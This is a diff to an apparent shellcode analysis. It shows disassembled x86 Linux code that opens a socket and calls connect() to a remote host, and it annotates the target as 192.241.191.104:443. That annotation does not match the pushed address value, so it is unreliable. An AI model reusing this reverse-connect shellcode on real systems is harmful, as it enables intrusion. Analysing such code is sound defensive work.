@@ -170,7 +170,7 @@ eax            0x56556000          1448435712
   |0x0804813f:	xchg   edi,eax
   |0x08048140:	pop    ebx
   |0x08048141:	push   0x71365f8d
-  |0x08048146:	push   0xbb010002
+  |0x08048146:	push   0xbb010002                               ; IP 192.241.191.104:443
   |0x0804814b:	mov    ecx,esp
   |0x0804814d:	push   0x66
   |0x0804814f:	pop    eax
@@ -179,7 +179,7 @@ eax            0x56556000          1448435712
   |0x08048152:	push   edi
   |0x08048153:	mov    ecx,esp
   |0x08048155:	inc    ebx
-  |0x08048156:	int    0x80                                     ;systemcall 0x66 connect( socketfd,  )
+  |0x08048156:	int    0x80                                     ;systemcall 0x66 connect()
   |0x08048158:	test   eax,eax
 +--0x0804815a:	jns    0x8048175
 | |0x0804815c:	dec    esi
